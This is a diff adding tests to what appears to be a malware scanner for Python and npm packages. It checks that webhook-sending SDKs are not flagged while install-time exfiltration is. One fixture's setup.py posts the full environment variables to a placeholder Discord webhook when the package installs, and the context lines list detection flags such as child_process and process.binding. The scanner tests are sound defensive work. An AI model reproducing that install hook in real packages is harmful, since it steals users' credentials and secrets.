@@ -949,3 +949,81 @@ const binding = process.binding('spawn_sync');
     assert any("child_process" in f for f in report.flags)
     assert any("globalThis['eval']" in f for f in report.flags)
     assert any("process.binding" in f for f in report.flags)
+
+
+def test_python_call_time_webhook_and_env_in_separate_files_is_not_malicious():
+    """
+    Legitimate SDK pattern: One module sends a Discord/webhook notification inside
+    a function, another module reads process/os environment variables for configuration.
+    Clean setup.py with no install-time execution. Must NOT be classified as MALICIOUS.
+    """
+    tarball = _make_tarball({
+        "pkg/setup.py": """
+from setuptools import setup, find_packages
+setup(name="clean-discord-notifier", version="1.0.0", packages=find_packages())
+""",
+        "pkg/notifier.py": """
+import urllib.request
+def notify(msg: str):
+    url = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz"
+    req = urllib.request.Request(url, data=msg.encode('utf-8'))
+    urllib.request.urlopen(req)
+""",
+        "pkg/config.py": """
+import os
+PORT = int(os.environ.get("PORT", 8080))
+DEBUG = os.environ.get("DEBUG", "0") == "1"
+""",
+    })
+    report = analyze_python_package_tarball(tarball, "clean-discord-notifier")
+    assert report.has_exfiltration_destination is True
+    assert report.verdict != ThreatVerdict.MALICIOUS
+    assert report.verdict in (ThreatVerdict.BENIGN_COMMUNITY, ThreatVerdict.SUSPICIOUS)
+
+
+def test_python_install_time_webhook_is_malicious():
+    """
+    Malicious pattern: setup.py executes exfiltration code at module root (install time).
+    Must be classified as MALICIOUS.
+    """
+    tarball = _make_tarball({
+        "pkg/setup.py": """
+import os, urllib.request
+from setuptools import setup
+
+url = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz"
+data = str(dict(os.environ)).encode()
+req = urllib.request.Request(url, data=data)
+urllib.request.urlopen(req)
+
+setup(name="fastapi-azure-b2c", version="1.0.0")
+""",
+    })
+    report = analyze_python_package_tarball(tarball, "fastapi-azure-b2c")
+    assert report.has_exfiltration_destination is True
+    assert report.verdict == ThreatVerdict.MALICIOUS
+
+
+def test_npm_call_time_webhook_and_env_in_separate_files_is_not_malicious():
+    """
+    Legitimate npm SDK: lib/webhook.js contains webhook endpoint, lib/config.js
+    reads process.env.PORT. No lifecycle install scripts. Must NOT be MALICIOUS.
+    """
+    tarball = _make_tarball({
+        "package/package.json": '{"name": "clean-webhook-sdk", "version": "1.0.0", "main": "index.js"}',
+        "package/lib/webhook.js": """
+const https = require('https');
+function sendAlert(text) {
+    const url = "https://discord.com/api/webhooks/9876543210/zyxwvutsrqponmlkjihgfedcba";
+    https.get(url);
+}
+module.exports = { sendAlert };
+""",
+        "package/lib/config.js": """
+const port = process.env.PORT || 3000;
+module.exports = { port };
+""",
+    })
+    report = analyze_npm_package_tarball(tarball, "clean-webhook-sdk")
+    assert report.verdict != ThreatVerdict.MALICIOUS
+    assert report.verdict in (ThreatVerdict.BENIGN_COMMUNITY, ThreatVerdict.SUSPICIOUS)
